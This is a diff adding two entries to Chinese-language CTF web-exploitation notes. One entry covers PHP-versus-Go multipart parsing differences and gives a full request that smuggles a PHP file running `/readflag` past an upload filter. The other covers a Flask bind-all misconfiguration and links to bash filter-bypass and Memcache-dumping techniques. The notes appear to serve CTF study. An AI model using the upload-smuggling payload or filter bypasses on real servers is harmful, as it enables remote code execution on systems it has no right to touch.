@@ -3685,3 +3685,26 @@ for _, bi := range ba {
 - 无msf纯手动做法： https://cyber-man.pl/GPNCTF-2024-inspect-element-web
 - 另外两个python脚本自动化做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#inspect-element
 - 参考资料： -failures-with-chromiums-remote-debugger-8a4c4d19429f#3a81 ， https://book.jorianwoltjer.com/web/chrome-remote-devtools
+459. php 和 golang http lib body parser的区别
+- 假如发送`x.php\x00abc`，php里会将其看成`x.php`，而golang里则不是（后缀不是`.php`）
+- body中发送`filename=a.php; filename*=UTF-8''a`，go得到的是`a`, php得到的是`a.php`
+- 再来一个：
+```
+Content-Type: multipart/form-data; BOUNDARY=go; xboundary=php;
+
+--go
+Content-Disposition: form-data; name="file"; filename="test.txt"
+Content-Type: text/plain
+
+--php
+Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Type: text/plain
+
+<%=`/readflag`;?>
+--php--
+--go--
+```
+460. [Chatting Service](https://siunam321.github.io/ctf/Codegate-CTF-2024-Preliminary/web/Chatting-Service/)
+- python flask misconfiguration。`app.run(host='0.0.0.0',port=5000)`表示该应用被绑定到所有的网络接口（network interfaces），只要访问运行这个程序的任意一个开放的`ip:5000`就能访问这个应用。比如机器在`x.x.x.x:8080`开放了应用A，将错误配置的应用B当成A的内部应用。由于应用B的错误配置，攻击者访问`x.x.x.x:5000`就能访问这个内部应用
+- 一些bash命令绕过滤： https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-paths-and-forbidden-words ，以及localhost替代`127.0.0.1`绕`.`过滤
+- 如何获取Memcache里的内容： https://chinnidiwakar.gitbook.io/githubimport/pentesting/11211-memcache 。python也有对应的memcache库：`pymemcache`
